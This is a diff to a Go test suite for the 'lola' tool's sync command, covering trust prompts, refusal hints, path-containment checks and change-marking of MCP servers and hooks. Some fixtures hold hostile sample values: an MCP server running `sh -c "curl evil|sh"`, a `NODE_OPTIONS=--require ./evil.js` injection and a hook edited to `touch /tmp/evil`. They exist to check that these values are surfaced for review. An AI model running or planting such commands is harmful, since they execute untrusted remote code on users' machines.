@@ -22,6 +22,7 @@ import (
 	"github.com/trevor-vaughan/lola-go/internal/manifest"
 	"github.com/trevor-vaughan/lola-go/internal/paths"
 	"github.com/trevor-vaughan/lola-go/internal/source"
+	"github.com/trevor-vaughan/lola-go/internal/store"
 	"github.com/trevor-vaughan/lola-go/internal/target"
 	"github.com/trevor-vaughan/lola-go/internal/testenv"
 	"github.com/trevor-vaughan/lola-go/internal/trust"
@@ -45,6 +46,7 @@ var _ = Describe("Sync", func() {
 		Expect(err).NotTo(HaveOccurred())
 		e = engine.New(p)
 		proj = filepath.Join(tmp, "proj")
+		e.Getwd = func() (string, error) { return proj, nil } // hints are written for a user in the project
 		Expect(os.MkdirAll(proj, 0o755)).To(Succeed())
 		sc = engine.Scope{Kind: target.Project, ProjectDir: proj}
 		src = filepath.Join(tmp, "src", "other")
@@ -151,9 +153,9 @@ var _ = Describe("Sync", func() {
 		return *m.Find("example")
 	}
 	var asked []engine.TrustReport
-	yes := func(rep engine.TrustReport) (bool, error) {
+	yes := func(rep engine.TrustReport) (engine.TrustAnswer, error) {
 		asked = append(asked, rep)
-		return true, nil
+		return engine.TrustAnswer{All: true}, nil
 	}
 	var removals [][]engine.Removal
 	confirm := func(rs []engine.Removal) (bool, error) {
@@ -337,7 +339,7 @@ var _ = Describe("Sync", func() {
 			Expect(e.Store.Remove("example")).To(BeTrue())
 			pull(manifest.Change{Set: []manifest.Entry{entry}})
 			before := state()
-			_, err := sync(engine.SyncRequest{Trust: func(engine.TrustReport) (bool, error) { return false, nil }})
+			_, err := sync(engine.SyncRequest{Trust: func(engine.TrustReport) (engine.TrustAnswer, error) { return engine.TrustAnswer{}, nil }})
 			Expect(err).To(MatchError(engine.ErrDeclined))
 			Expect(state()).To(Equal(before), "no cache, project or trust record change")
 		})
@@ -354,36 +356,102 @@ var _ = Describe("Sync", func() {
 				before := state()
 				req.ConfirmRemovals = confirm // -y
 				_, err := sync(req)
-				Expect(err).To(MatchError(ContainSubstring(want+", and there is no terminal to ask on")), name)
-				Expect(errs.Hints(err)).To(Equal([]string{"see the changes: lola sync -n", "then accept them: lola sync --trust"}), name)
+				Expect(err).To(MatchError("lola sync needs your trust for "+want+", and there is no terminal to ask on"), name)
+				flags := ""
+				if req.Update {
+					flags = " --update"
+				}
+				Expect(errs.Hints(err)).To(Equal([]string{"see them: lola sync" + flags + " -n", "then accept them: lola sync" + flags + " --trust -y",
+					"-y confirms removals only; accept the changes with --trust"}), name)
 				refusal, ok := errors.AsType[*engine.TrustRefusalError](err)
 				Expect(ok).To(BeTrue(), name)
 				Expect(requests.Load()).To(BeZero(), "%s: the git server saw no request", name)
 				Expect(state()).To(Equal(before), "%s: nothing installed, cached or recorded", name)
 				return refusal
 			}
-			for name, change := range map[string]manifest.Change{
-				"a pulled pinned entry":   {Set: []manifest.Entry{entry}},
-				"a pulled unpinned entry": {Set: []manifest.Entry{unpinned}},
+			for name, c := range map[string]struct {
+				change manifest.Change
+				want   string
+			}{
+				"a pulled pinned entry":   {manifest.Change{Set: []manifest.Entry{entry}}, "changes to .lola/project.yml"},
+				"a pulled unpinned entry": {manifest.Change{Set: []manifest.Entry{unpinned}}, "changes to .lola/project.yml and the pins it would write for example"},
 			} {
 				pull(manifest.Change{Remove: []string{"example"}})
-				pull(change)
-				refusal := refused(name, engine.SyncRequest{}, ".lola/project.yml changed since you last trusted it")
+				pull(c.change)
+				refusal := refused(name, engine.SyncRequest{}, c.want)
 				Expect(refusal.Report.Changes).To(HaveExactElements(And(HaveField("Module", "example"), HaveField("Kind", "added"))), name)
 			}
 
-			// --update of an entry the user installed, pinned and cached: the record covers it.
+			// --update of an entry the user installed, pinned and cached: the record covers it, so the
+			// refusal names the entry it would re-pin, with no field changes yet.
 			pull(manifest.Change{Remove: []string{"example"}})
 			install(sc, engine.InstallRequest{Arg: url, Ref: "v1"})
 			Expect(covered()).To(BeTrue())
-			refusal := refused("--update of a trusted entry", engine.SyncRequest{UpdateAll: true},
-				"lola sync would write pins to .lola/project.yml, which needs your trust")
-			Expect(refusal.Report.Changes).To(BeEmpty())
+			refusal := refused("--update of a trusted entry", engine.SyncRequest{Update: true}, "the pins it would write for example")
+			Expect(refusal.Report.Changes).To(HaveExactElements(And(HaveField("Module", "example"), HaveField("Fields", BeEmpty()),
+				HaveField("Reason", "re-pin from v1 (--update; not fetched yet)"))))
+			Expect(refusal.Report.ManifestChanged).To(BeFalse())
+		})
+
+		It("off a terminal, one refusal names every answer the run needs", func() {
+			install(sc, engine.InstallRequest{Arg: url, Ref: "v1"}, engine.InstallRequest{Arg: src})
+			pulled := *loadManifest().Find("example")
+			pulled.Ref = "main"
+			pull(manifest.Change{Set: []manifest.Entry{pulled}, Remove: []string{"other"}})
+			before := state()
+			for _, c := range []struct {
+				name     string
+				req      engine.SyncRequest
+				msg      string
+				hints    []string
+				trust    bool
+				removals bool
+			}{
+				{"neither --trust nor -y", engine.SyncRequest{},
+					"your trust for changes to .lola/project.yml; and your confirmation to remove other",
+					[]string{"see them: lola sync -n", "then accept them: lola sync --trust -y"}, true, true},
+				{"-y alone", engine.SyncRequest{ConfirmRemovals: confirm}, "your trust for changes to .lola/project.yml",
+					[]string{"see them: lola sync -n", "then accept them: lola sync --trust -y", "-y confirms removals only; accept the changes with --trust"},
+					true, false},
+				{"--trust alone", engine.SyncRequest{Trust: yes}, "your confirmation to remove other",
+					[]string{"see them: lola sync -n", "then confirm them: lola sync --trust -y"}, false, true},
+			} {
+				requests.Store(0)
+				_, err := sync(c.req)
+				Expect(err).To(MatchError("lola sync needs "+c.msg+", and there is no terminal to ask on"), c.name)
+				Expect(errs.Hints(err)).To(Equal(c.hints), c.name)
+				refusal, ok := errors.AsType[*engine.TrustRefusalError](err)
+				Expect(ok).To(BeTrue(), c.name)
+				if c.trust {
+					Expect(refusal.Report.Changes).To(ContainElements(HaveField("Module", "example"), HaveField("Module", "other")), c.name)
+				} else {
+					Expect(refusal.Report.Changes).To(BeEmpty(), c.name)
+				}
+				if c.removals {
+					Expect(refusal.Removals).To(HaveExactElements(HaveField("Module", "other")), c.name)
+				} else {
+					Expect(refusal.Removals).To(BeEmpty(), c.name)
+				}
+				Expect(requests.Load()).To(BeZero(), "%s: the git server saw no request", c.name)
+				Expect(state()).To(Equal(before), c.name)
+				Expect(asked).To(BeEmpty(), "%s: --trust is not asked before the refusal", c.name)
+				Expect(removals).To(BeEmpty(), c.name)
+			}
+
+			// Every hint leads to lola sync --trust -y, which applies: no refusal loop.
+			_, err := sync(engine.SyncRequest{Trust: yes, ConfirmRemovals: confirm})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(lockFile().Modules).NotTo(HaveKey("other"))
+			Expect(filepath.Join(proj, ".claude/commands/other.md")).NotTo(BeAnExistingFile())
+			Expect(lockFile().Modules["example"].Ref).To(Equal("main"))
+			res, err := sync(engine.SyncRequest{})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(res.InSync).To(BeTrue())
 		})
 
 		It("syncs --update of folders alone off a terminal: a folder is never pinned", func() {
 			install(sc, engine.InstallRequest{Arg: src})
-			res, err := sync(engine.SyncRequest{UpdateAll: true})
+			res, err := sync(engine.SyncRequest{Update: true})
 			Expect(err).NotTo(HaveOccurred())
 			Expect(res.Pins).To(BeEmpty())
 		})
@@ -451,7 +519,7 @@ var _ = Describe("Sync", func() {
 			Expect(os.Symlink(outside, real)).To(Succeed())
 			Expect(e.Store.Remove("real")).To(BeTrue()) // as the refusal of another source for the name coaches
 			Expect(covered()).To(BeTrue())
-			for _, t := range []func(engine.TrustReport) (bool, error){nil, yes} {
+			for _, t := range []func(engine.TrustReport) (engine.TrustAnswer, error){nil, yes} {
 				before := state()
 				_, err = sync(engine.SyncRequest{Trust: t, ConfirmRemovals: confirm})
 				Expect(err).To(MatchError("real: local source mods/real resolves outside the project (" + outside + ")"))
@@ -459,6 +527,49 @@ var _ = Describe("Sync", func() {
 				Expect(asked).To(BeEmpty())
 				Expect(state()).To(Equal(before))
 			}
+		})
+
+		It("a containment refusal's install hint covers an entry without targets of its own", func() {
+			Expect(os.MkdirAll(filepath.Join(proj, ".lola"), 0o755)).To(Succeed())
+			Expect(os.WriteFile(filepath.Join(proj, ".lola", "project.yml"), []byte("version: 1\ntargets: [claude-code]\nmodules:\n"+
+				"  - name: other\n    source: "+src+"\n"), 0o600)).To(Succeed())
+			_, err := sync(engine.SyncRequest{Trust: yes})
+			Expect(err).To(MatchError(ContainSubstring("other: local source " + src + " resolves outside the project")))
+			Expect(errs.Hints(err)).To(Equal([]string{"install it yourself if you trust it: lola install " + src}))
+			install(sc, engine.InstallRequest{Arg: src}) // as hinted
+			_, err = sync(engine.SyncRequest{Trust: yes})
+			Expect(err).NotTo(HaveOccurred(), "the entry is covered: only the hand-written top-level targets are asked about")
+			Expect(asked).To(HaveLen(1))
+			Expect(asked[0].Targets).NotTo(BeNil())
+		})
+
+		It("a containment refusal's install hint works when the cache's source for the name is gone", func() {
+			moved := filepath.Join(tmp, "moved", "other")
+			writeTree(moved, map[string]string{"lola.yml": "name: other\n", "commands/other.md": "Other\n"})
+			_, err := e.Install(ctx, engine.Scope{Kind: target.User}, tmp, []engine.InstallRequest{{Arg: moved}}, claude)
+			Expect(err).NotTo(HaveOccurred())
+			Expect(os.RemoveAll(moved)).To(Succeed())
+			Expect(os.MkdirAll(filepath.Join(proj, ".lola"), 0o755)).To(Succeed())
+			Expect(os.WriteFile(filepath.Join(proj, ".lola", "project.yml"), []byte("version: 1\ntargets: [claude-code]\nmodules:\n"+
+				"  - name: other\n    source: "+src+"\n"), 0o600)).To(Succeed())
+			_, err = sync(engine.SyncRequest{Trust: yes})
+			Expect(err).To(MatchError(ContainSubstring("other: local source " + src + " resolves outside the project")))
+			Expect(errs.Hints(err)).To(Equal([]string{"install it yourself if you trust it: lola install " + src}))
+			install(sc, engine.InstallRequest{Arg: src}) // as hinted: the one-source rule does not stand in its way
+			_, err = sync(engine.SyncRequest{Trust: yes})
+			Expect(err).NotTo(HaveOccurred(), "the entry is covered: only the hand-written top-level targets are asked about")
+			Expect(asked).To(HaveLen(1))
+			Expect(asked[0].Targets).NotTo(BeNil())
+		})
+
+		It("a containment refusal's install hint names the project when run from outside it", func() {
+			Expect(os.MkdirAll(filepath.Join(proj, ".lola"), 0o755)).To(Succeed())
+			Expect(os.WriteFile(filepath.Join(proj, ".lola", "project.yml"), []byte("version: 1\ntargets: [claude-code]\nmodules:\n"+
+				"  - name: other\n    source: "+src+"\n"), 0o600)).To(Succeed())
+			e.Getwd = func() (string, error) { return tmp, nil }
+			_, err := sync(engine.SyncRequest{Trust: yes})
+			Expect(err).To(MatchError(ContainSubstring("other: local source " + src + " resolves outside the project")))
+			Expect(errs.Hints(err)).To(Equal([]string{"install it yourself if you trust it: lola install -C " + proj + " " + src}))
 		})
 
 		It("accepts a source inside a project whose root is a symbolic link", func() {
@@ -609,11 +720,11 @@ var _ = Describe("Sync", func() {
 			c := asked[0].Changes[0]
 			Expect(c.Module).To(Equal("kit"))
 			Expect(c.Files).To(Equal([]engine.FileChange{{Path: "commands/fix.md", Change: "added"}, {Path: "hooks/post.sh", Change: "added"},
-				{Path: "lola.yml", Change: "added"}, {Path: "mcps.json", Change: "added"}, {Path: "skills/review/SKILL.md", Change: "added"}}))
+				{Path: "mcps.json", Change: "added"}, {Path: "skills/review/SKILL.md", Change: "added"}}))
 			Expect(c.FilesNote).To(BeEmpty(), "nothing was installed to compare with")
-			Expect(c.MCPServers).To(ConsistOf(engine.ContentMCPServer{Name: "gh", Transport: "stdio", Runs: "npx -y @acme/gh-mcp", Env: []string{}, Headers: []string{}},
-				engine.ContentMCPServer{Name: "web", Transport: "http", Runs: "https://mcp.example.com/x", Env: []string{}, Headers: []string{}}))
-			Expect(c.Hooks).To(ContainElement(engine.ContentHook{Kind: "install", Event: "post-install", Detail: "hooks/post.sh"}))
+			Expect(c.MCPServers).To(ConsistOf(engine.ContentMCPServer{Name: "gh", Transport: "stdio", Change: "added", Runs: "npx -y @acme/gh-mcp", Env: []string{}, Headers: []string{}},
+				engine.ContentMCPServer{Name: "web", Transport: "http", Change: "added", Runs: "https://mcp.example.com/x", Env: []string{}, Headers: []string{}}))
+			Expect(c.Hooks).To(ContainElement(engine.ContentHook{Kind: "install", Event: "post-install", Detail: "hooks/post.sh", Change: "added"}))
 			Expect(c.Hooks).To(ContainElement(And(HaveField("Kind", "runtime"), HaveField("Target", "claude-code"), HaveField("Event", "PreToolUse"),
 				HaveField("Detail", ContainSubstring("matcher Bash")), HaveField("Detail", ContainSubstring("./guard.sh")))))
 		})
@@ -634,14 +745,55 @@ var _ = Describe("Sync", func() {
 			Expect(err).NotTo(HaveOccurred())
 			servers := asked[0].Changes[0].MCPServers
 			Expect(servers).To(ConsistOf(
-				engine.ContentMCPServer{Name: "gh", Transport: "stdio", Runs: `npx "-y @acme/gh-mcp"`,
+				engine.ContentMCPServer{Name: "gh", Transport: "stdio", Change: "added", Runs: `npx "-y @acme/gh-mcp"`,
 					Env: []string{"A=1", "NODE_OPTIONS=--require ./evil.js"}, Headers: []string{}, Cwd: "tools"},
-				engine.ContentMCPServer{Name: "sh", Transport: "stdio", Runs: `sh -c "curl evil|sh"`, Env: []string{}, Headers: []string{}},
-				engine.ContentMCPServer{Name: "web", Transport: "http", Runs: "https://mcp.example.com/x", Env: []string{},
+				engine.ContentMCPServer{Name: "sh", Transport: "stdio", Change: "added", Runs: `sh -c "curl evil|sh"`, Env: []string{}, Headers: []string{}},
+				engine.ContentMCPServer{Name: "web", Transport: "http", Change: "added", Runs: "https://mcp.example.com/x", Env: []string{},
 					Headers: []string{"Authorization: Bearer ${GITHUB_TOKEN}"}}))
 			b, err := json.Marshal(servers)
 			Expect(err).NotTo(HaveOccurred())
-			Expect(string(b)).To(ContainSubstring(`{"name":"sh","transport":"stdio","runs":"sh -c \"curl evil|sh\"","env":[],"headers":[],"cwd":""}`))
+			Expect(string(b)).To(ContainSubstring(`{"name":"sh","transport":"stdio","change":"added","runs":"sh -c \"curl evil|sh\"","env":[],"headers":[],"cwd":""}`))
+		})
+
+		It("marks each MCP server and hook against the version installed", func() {
+			kit := filepath.Join(proj, "mods", "kit")
+			writeTree(kit, map[string]string{"lola.yml": "name: kit\nhooks: {pre-install: hooks/pre.sh, post-install: hooks/old.sh}\n", "hooks/old.sh": "#!/bin/sh\n",
+				"hooks/pre.sh": "#!/bin/sh\n", "commands/k.md": "K\n", "mcps.json": `{"mcpServers":{"a":{"command":"a-mcp"},"b":{"type":"http","url":"https://b.example/mcp"},` +
+					`"d":{"command":"d-mcp"}}}`})
+			Expect(os.Chmod(filepath.Join(kit, "hooks", "old.sh"), 0o755)).To(Succeed())
+			Expect(os.Chmod(filepath.Join(kit, "hooks", "pre.sh"), 0o755)).To(Succeed())
+			_, err := e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: kit}}, engine.Options{Targets: claude.Targets, AllowHooks: true})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(os.Remove(filepath.Join(kit, "hooks", "old.sh"))).To(Succeed())
+			writeTree(kit, map[string]string{"lola.yml": "name: kit\nhooks: {pre-install: hooks/pre.sh, post-install: hooks/new.sh}\n", "hooks/new.sh": "#!/bin/sh\n",
+				"mcps.json": `{"mcpServers":{"a":{"command":"a-mcp","args":["--evil"]},"b":{"type":"http","url":"https://b.example/mcp"},` +
+					`"c":{"command":"c-mcp"}}}`})
+			Expect(os.Chmod(filepath.Join(kit, "hooks", "new.sh"), 0o755)).To(Succeed())
+
+			res, err := sync(engine.SyncRequest{Options: engine.Options{DryRun: true}})
+			Expect(err).NotTo(HaveOccurred())
+			c := res.Trust.Changes[0]
+			Expect(c.MCPServers).To(HaveExactElements(
+				And(HaveField("Name", "a"), HaveField("Change", "changed"), HaveField("Runs", "a-mcp --evil"),
+					HaveField("Previous.Runs", "a-mcp"), HaveField("Previous.Change", "")),
+				And(HaveField("Name", "b"), HaveField("Change", "unchanged"), HaveField("Previous", BeNil())),
+				And(HaveField("Name", "c"), HaveField("Change", "added")),
+				And(HaveField("Name", "d"), HaveField("Change", "removed"), HaveField("Runs", "d-mcp"))))
+			Expect(c.Hooks).To(ConsistOf(engine.ContentHook{Kind: "install", Event: "post-install", Detail: "hooks/new.sh", Change: "added"},
+				engine.ContentHook{Kind: "install", Event: "post-install", Detail: "hooks/old.sh", Change: "removed"},
+				engine.ContentHook{Kind: "install", Event: "pre-install", Detail: "hooks/pre.sh", Change: "unchanged"}),
+				"a hook is identified by all its fields: another script is one removed and one added")
+			b, err := json.Marshal(c.MCPServers)
+			Expect(err).NotTo(HaveOccurred())
+			Expect(strings.Count(string(b), `"previous"`)).To(Equal(1), "previous is present only for a changed server")
+			Expect(string(b)).To(ContainSubstring(`"previous":{"name":"a","transport":"stdio","runs":"a-mcp","env":[],"headers":[],"cwd":""}`))
+
+			// An added entry marks everything added.
+			checkout()
+			res, err = sync(engine.SyncRequest{Options: engine.Options{DryRun: true}})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(res.Trust.Changes[0].MCPServers).To(HaveEach(HaveField("Change", "added")))
+			Expect(res.Trust.Changes[0].Hooks).To(HaveEach(HaveField("Change", "added")))
 		})
 
 		It("shows an --update as a change of the pin with the files it changes, and asks before writing it", func() {
@@ -649,8 +801,11 @@ var _ = Describe("Sync", func() {
 			before := loadManifest().Find("example")
 			commit := push(map[string]string{"commands/ship.md": "Ship v2\n", "commands/new.md": "New\n"})
 
-			no := func(rep engine.TrustReport) (bool, error) { asked = append(asked, rep); return false, nil }
-			_, err := sync(engine.SyncRequest{Update: []string{"example"}, Trust: no})
+			no := func(rep engine.TrustReport) (engine.TrustAnswer, error) {
+				asked = append(asked, rep)
+				return engine.TrustAnswer{}, nil
+			}
+			_, err := sync(engine.SyncRequest{Modules: []string{"example"}, Update: true, Trust: no})
 			Expect(err).To(MatchError(engine.ErrDeclined))
 			Expect(loadManifest().Find("example")).To(Equal(before), "a No writes no pin")
 			c := asked[0].Changes[0]
@@ -660,13 +815,27 @@ var _ = Describe("Sync", func() {
 			Expect(c.Fields[0].To).To(Equal(commit))
 			Expect(c.Files).To(Equal([]engine.FileChange{{Path: "commands/new.md", Change: "added"}, {Path: "commands/ship.md", Change: "changed"}}))
 
-			res, err := sync(engine.SyncRequest{Update: []string{"example"}, Trust: yes})
+			res, err := sync(engine.SyncRequest{Modules: []string{"example"}, Update: true, Trust: yes})
 			Expect(err).NotTo(HaveOccurred())
 			Expect(res.Pins).To(HaveExactElements(And(HaveField("Reason", engine.PinUpdate), HaveField("Commit", commit),
 				HaveField("PreviousDigest", before.Digest), HaveField("Written", true))))
 			Expect(loadManifest().Find("example").Commit).To(Equal(commit))
 			Expect(read(".claude/commands/ship.md")).To(Equal("Ship v2\n"))
 			Expect(covered()).To(BeTrue())
+		})
+
+		It("shows a new in-repo folder's files in the refusal, read locally and cached nowhere", func() {
+			install(sc, engine.InstallRequest{Arg: src})
+			writeTree(filepath.Join(proj, "mods", "notes"), map[string]string{"lola.yml": "name: notes\n", "commands/notes.md": "Notes\n"})
+			pull(manifest.Change{Set: []manifest.Entry{{Name: "notes", Source: "mods/notes"}}})
+			before := state()
+
+			_, err := sync(engine.SyncRequest{})
+			refusal, ok := errors.AsType[*engine.TrustRefusalError](err)
+			Expect(ok).To(BeTrue())
+			Expect(refusal.Report.Changes).To(ContainElement(And(HaveField("Module", "notes"), HaveField("Kind", "added"),
+				HaveField("Files", ContainElement(engine.FileChange{Path: "commands/notes.md", Change: "added"})))))
+			Expect(state()).To(Equal(before), "nothing installed, cached or recorded")
 		})
 
 		It("asks before installing a folder module whose content changed since lola installed it", func() {
@@ -680,21 +849,36 @@ var _ = Describe("Sync", func() {
 
 			before := state()
 			_, err := sync(engine.SyncRequest{})
-			Expect(err).To(MatchError("the content of kit changed since lola last installed it, which needs your trust, and there is no terminal to ask on"))
+			Expect(err).To(MatchError("lola sync needs your trust for the changed content of kit, and there is no terminal to ask on"))
+			Expect(errs.Hints(err)).To(Equal([]string{"see them: lola sync -n", "then accept them: lola sync --trust",
+				"or accept some: lola sync --trust <module>…", "edited it yourself? lola install ./mods/kit"}))
+			// Each hint repeating the run carries its flags; a run of one module has none to pick.
+			_, err = sync(engine.SyncRequest{Update: true})
+			Expect(errs.Hints(err)).To(ContainElement("or accept some: lola sync --update --trust <module>…"))
+			_, err = sync(engine.SyncRequest{Modules: []string{"kit"}})
+			Expect(errs.Hints(err)).To(Equal([]string{"see them: lola sync kit -n", "then accept them: lola sync kit --trust",
+				"edited it yourself? lola install ./mods/kit"}))
+			_, err = sync(engine.SyncRequest{})
 			refusal, ok := errors.AsType[*engine.TrustRefusalError](err)
 			Expect(ok).To(BeTrue())
 			Expect(refusal.Report.Status).To(Equal("changed"))
 			Expect(refusal.Report.Changes).To(HaveExactElements(And(HaveField("Module", "kit"), HaveField("Kind", "changed"),
-				HaveField("Fields", HaveExactElements(And(HaveField("Field", "digest"), HaveField("From", installed), HaveField("To", Not(Equal(installed)))))))))
+				HaveField("Fields", HaveExactElements(And(HaveField("Field", "digest"), HaveField("From", installed), HaveField("To", Not(Equal(installed)))))),
+				HaveField("Reason", "content changed since lola installed it"),
+				HaveField("Files", Equal([]engine.FileChange{{Path: "mcps.json", Change: "added"}})))),
+				"a folder is local: the refusal shows its content")
 			Expect(state()).To(Equal(before), "nothing installed, cached or recorded")
 
-			no := func(rep engine.TrustReport) (bool, error) { asked = append(asked, rep); return false, nil }
+			no := func(rep engine.TrustReport) (engine.TrustAnswer, error) {
+				asked = append(asked, rep)
+				return engine.TrustAnswer{}, nil
+			}
 			_, err = sync(engine.SyncRequest{Trust: no})
 			Expect(err).To(MatchError(engine.ErrDeclined))
 			Expect(state()).To(Equal(before), "a No caches none of it")
 			c := asked[0].Changes[0]
 			Expect(c.Files).To(Equal([]engine.FileChange{{Path: "mcps.json", Change: "added"}}))
-			Expect(c.MCPServers).To(ConsistOf(engine.ContentMCPServer{Name: "gh", Transport: "stdio", Runs: "npx -y @acme/gh-mcp", Env: []string{}, Headers: []string{}}))
+			Expect(c.MCPServers).To(ConsistOf(engine.ContentMCPServer{Name: "gh", Transport: "stdio", Change: "added", Runs: "npx -y @acme/gh-mcp", Env: []string{}, Headers: []string{}}))
 
 			asked = nil
 			res, err := sync(engine.SyncRequest{Trust: yes})
@@ -743,12 +927,68 @@ var _ = Describe("Sync", func() {
 			install(sc, engine.InstallRequest{Arg: url, Ref: "main"})
 			push(map[string]string{"commands/ship.md": "Ship v2\n"})
 			Expect(e.Store.Remove("example")).To(BeTrue())
-			no := func(rep engine.TrustReport) (bool, error) { asked = append(asked, rep); return false, nil }
-			_, err := sync(engine.SyncRequest{UpdateAll: true, Trust: no})
+			no := func(rep engine.TrustReport) (engine.TrustAnswer, error) {
+				asked = append(asked, rep)
+				return engine.TrustAnswer{}, nil
+			}
+			_, err := sync(engine.SyncRequest{Update: true, Trust: no})
 			Expect(err).To(MatchError(engine.ErrDeclined))
 			c := asked[0].Changes[0]
 			Expect(c.FilesNote).To(Equal("the version installed is not in your cache, so every file is listed as added"))
 			Expect(c.Files).To(ContainElement(engine.FileChange{Path: "commands/ship.md", Change: "added"}))
+			Expect(c.Files).NotTo(ContainElement(HaveField("Change", Not(Equal("added")))))
+		})
+
+		It("marks an install hook changed when its script changed", func() {
+			kit := filepath.Join(proj, "mods", "kit")
+			writeTree(kit, map[string]string{"lola.yml": "name: kit\nhooks: {post-install: hooks/post.sh}\n", "hooks/post.sh": "#!/bin/sh\n", "commands/k.md": "K\n"})
+			Expect(os.Chmod(filepath.Join(kit, "hooks", "post.sh"), 0o755)).To(Succeed())
+			_, err := e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: kit}}, engine.Options{Targets: claude.Targets, AllowHooks: true})
+			Expect(err).NotTo(HaveOccurred())
+			writeTree(kit, map[string]string{"hooks/post.sh": "#!/bin/sh\ntouch /tmp/evil\n"})
+			Expect(os.Chmod(filepath.Join(kit, "hooks", "post.sh"), 0o755)).To(Succeed())
+
+			res, err := sync(engine.SyncRequest{Options: engine.Options{DryRun: true}})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(res.Trust.Changes[0].Hooks).To(ConsistOf(engine.ContentHook{Kind: "install", Event: "post-install", Detail: "hooks/post.sh", Change: "changed"}))
+		})
+
+		It("marks an MCP server changed when only its targets or a hidden character differ", func() {
+			kit := filepath.Join(proj, "mods", "kit")
+			writeTree(kit, map[string]string{"commands/k.md": "K\n", "lola.yml": "name: kit\ncomponents:\n  mcp:\n" +
+				"    - {name: a, server: {type: stdio, command: a-mcp}}\n    - {name: b, server: {type: stdio, command: b-mcp, env: {V: \"\\u0001\"}}}\n"})
+			_, err := e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: kit}}, engine.Options{Targets: claude.Targets})
+			Expect(err).NotTo(HaveOccurred())
+			writeTree(kit, map[string]string{"lola.yml": "name: kit\ncomponents:\n  mcp:\n" +
+				"    - {name: a, server: {type: stdio, command: a-mcp}, targets: [claude-code]}\n    - {name: b, server: {type: stdio, command: b-mcp, env: {V: '?'}}}\n"})
+
+			res, err := sync(engine.SyncRequest{Options: engine.Options{DryRun: true}})
+			Expect(err).NotTo(HaveOccurred())
+			servers := res.Trust.Changes[0].MCPServers
+			Expect(servers).To(HaveExactElements(HaveField("Change", "changed"), HaveField("Change", "changed")))
+			Expect(servers[1].Env).To(Equal(servers[1].Previous.Env), "b shows the same either way: only the raw bytes differ")
+		})
+
+		It("compares with nothing when the version installed cannot be read, and goes on", func() {
+			if os.Geteuid() == 0 {
+				Skip("root ignores file permissions")
+			}
+			install(sc, engine.InstallRequest{Arg: url, Ref: "main"})
+			push(map[string]string{"commands/ship.md": "Ship v2\n"})
+			contents, err := filepath.Glob(filepath.Join(p.Store, "example", "versions", "*", "content"))
+			Expect(err).NotTo(HaveOccurred())
+			Expect(contents).To(HaveLen(1))
+			extra := filepath.Join(contents[0], "unreadable.txt") // not a component, so the cache still loads the version
+			Expect(os.WriteFile(extra, []byte("x"), 0o000)).To(Succeed())
+			DeferCleanup(func() { _ = os.Chmod(extra, 0o600) })
+			no := func(rep engine.TrustReport) (engine.TrustAnswer, error) {
+				asked = append(asked, rep)
+				return engine.TrustAnswer{}, nil
+			}
+			_, err = sync(engine.SyncRequest{Update: true, Trust: no})
+			Expect(err).To(MatchError(engine.ErrDeclined))
+			c := asked[0].Changes[0]
+			Expect(c.FilesNote).To(And(HavePrefix("lola could not read the version installed from your cache ("), HaveSuffix("), so every file is listed as added")))
 			Expect(c.Files).NotTo(ContainElement(HaveField("Change", Not(Equal("added")))))
 		})
 
@@ -759,8 +999,11 @@ var _ = Describe("Sync", func() {
 			Expect(err).NotTo(HaveOccurred())
 			Expect(origins).To(HaveLen(1))
 			Expect(os.WriteFile(origins[0], []byte("digest: sha256:bad\n"), 0o600)).To(Succeed())
-			no := func(rep engine.TrustReport) (bool, error) { asked = append(asked, rep); return false, nil }
-			_, err = sync(engine.SyncRequest{UpdateAll: true, Trust: no})
+			no := func(rep engine.TrustReport) (engine.TrustAnswer, error) {
+				asked = append(asked, rep)
+				return engine.TrustAnswer{}, nil
+			}
+			_, err = sync(engine.SyncRequest{Update: true, Trust: no})
 			Expect(err).To(MatchError(engine.ErrDeclined))
 			c := asked[0].Changes[0]
 			Expect(c.FilesNote).To(And(HavePrefix("lola could not read the version installed from your cache ("),
@@ -799,6 +1042,221 @@ var _ = Describe("Sync", func() {
 				_, err = sync(engine.SyncRequest{Trust: yes})
 				Expect(err).To(MatchError(ContainSubstring("holds control or invisible characters")), entry)
 			}
+		})
+	})
+
+	It("hints name the scope the user ran", func() {
+		folder := filepath.Join(tmp, "elsewhere", "example")
+		writeTree(folder, exampleModule)
+		install(sc, engine.InstallRequest{Arg: folder})
+		Expect(e.Store.Remove("example")).To(BeTrue())
+		install(engine.Scope{Kind: target.User}, engine.InstallRequest{Arg: url})
+		sub := filepath.Join(proj, "sub")
+		Expect(os.MkdirAll(sub, 0o755)).To(Succeed())
+		for _, c := range []struct{ wd, flags string }{{sub, ""}, {tmp, "-C " + proj + " "}} {
+			e.Getwd = func() (string, error) { return c.wd, nil }
+			_, err := sync(engine.SyncRequest{Modules: []string{"example"}, Update: true, Options: engine.Options{Force: true}})
+			Expect(err).To(MatchError(ContainSubstring("example in your cache comes from")))
+			Expect(errs.Hints(err)).To(Equal([]string{"remove it from your cache: lola cache rm example (add -y off a terminal)",
+				"then: lola sync " + c.flags + "example --update --force"}), "from %s", c.wd)
+		}
+
+		manPath := filepath.Join(proj, ".lola", "project.yml")
+		writeTree(filepath.Join(proj, "mods", "kit"), map[string]string{"lola.yml": "name: kit\n", "commands/kit.md": "Kit\n"})
+		Expect(os.WriteFile(manPath, []byte("version: 1\ntargets: [claude-code]\nmodules:\n  - name: kit\n    source: mods/kit\n"), 0o600)).To(Succeed())
+		_, err := sync(engine.SyncRequest{})
+		Expect(errs.Hints(err)).To(Equal([]string{"see them: lola sync -C " + proj + " -n", "then accept them: lola sync -C " + proj + " --trust -y"}),
+			"the trust and the removal of example are both missing")
+
+		digest := "sha256:" + strings.Repeat("a", 64)
+		Expect(os.WriteFile(manPath, []byte("version: 1\ntargets: [claude-code]\nmodules:\n  - name: example\n    source: "+url+
+			"\n    digest: "+digest+"\n"), 0o600)).To(Succeed())
+		_, err = sync(engine.SyncRequest{})
+		Expect(errs.Hints(err)).To(Equal([]string{"re-pin it: lola sync -C " + proj + " --update example"}))
+
+		user := engine.Scope{Kind: target.User}
+		Expect(os.WriteFile(p.UserManifest, []byte("version: 1\nmodules: []\n"), 0o600)).To(Succeed())
+		_, err = sync(engine.SyncRequest{Scope: user})
